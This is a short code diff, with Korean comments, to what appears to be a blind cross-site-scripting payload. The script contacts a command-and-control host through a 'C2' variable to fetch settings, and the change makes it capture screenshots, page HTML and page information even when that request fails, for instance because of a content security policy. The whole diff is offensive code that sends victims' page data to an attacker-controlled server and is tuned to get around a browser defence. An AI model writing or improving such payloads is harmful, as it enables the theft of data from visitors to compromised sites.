@@ -107,10 +107,17 @@
     window.__bx_collected = true;
     try {
       // fetch() 대신 동기 XHR: anchor 모드 document.open()이 fetch를 취소하기 전에 완료
-      var _cfgXhr = new XMLHttpRequest();
-      _cfgXhr.open("GET", C2 + "/config", false);
-      _cfgXhr.send();
-      var _cfg = JSON.parse(_cfgXhr.responseText);
+      // /config 실패(CSP 등) 시에도 수집이 죽지 않게 기본값 ON 폴백
+      var _cfg = { screenshot: true, html: true, pageinfo: true };
+      try {
+        var _cfgXhr = new XMLHttpRequest();
+        _cfgXhr.open("GET", C2 + "/config", false);
+        _cfgXhr.send();
+        var _srv = JSON.parse(_cfgXhr.responseText);
+        _cfg.screenshot = !!_srv.screenshot;
+        _cfg.html = !!_srv.html;
+        _cfg.pageinfo = !!_srv.pageinfo;
+      } catch (e) {}
 
       if (_cfg.pageinfo) {
         var pi = {
